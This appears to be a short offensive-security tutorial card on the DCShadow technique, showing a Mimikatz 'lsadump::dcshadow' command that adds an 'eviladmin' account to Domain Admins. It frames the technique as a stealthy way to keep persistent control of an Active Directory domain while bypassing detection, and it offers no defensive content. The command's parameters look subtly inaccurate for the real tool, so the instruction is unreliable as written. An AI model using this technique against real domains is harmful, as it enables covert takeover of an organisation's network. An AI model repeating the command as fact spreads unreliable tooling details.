Modifying AD Objects via DCShadow

Using Mimikatz to create new Domain Admin accounts stealthily.

Mimikatz DCShadow Command
# Mimikatz DCShadow (simplified steps)
# 1. Elevate current machine to a rogue DC (requires specific permissions)
# 2. Add a new Domain Admin user
mimikatz.exe
lsadump::dcshadow /user:eviladmin /password:P@ssw0rd123! /domain:corp.local /group:"Domain Admins"
  • `/user`: Specifies the username for the new account to be created.
  • `/password`: Sets the password for the new user account.
  • `/domain`: Specifies the target domain for the modification.
  • `/group`: Adds the new user to a specified group, e.g., "Domain Admins".
Key Takeaway

Mimikatz's `lsadump::dcshadow` command allows for stealthy creation of new privileged accounts or modification of AD objects by leveraging rogue DC replication.

DCShadow Attack Flow
Compromised Host
Rogue DC Registration
Inject AD Changes
Compromised host registers as a rogue DC, then injects changes into Active Directory.
Persistence Strategy

DCShadow is a prime technique for establishing persistent access by creating new, stealthy administrative accounts that blend into normal AD operations.

High Impact

This attack can bypass many security controls and detection mechanisms, making it highly effective for maintaining long-term control over a domain.
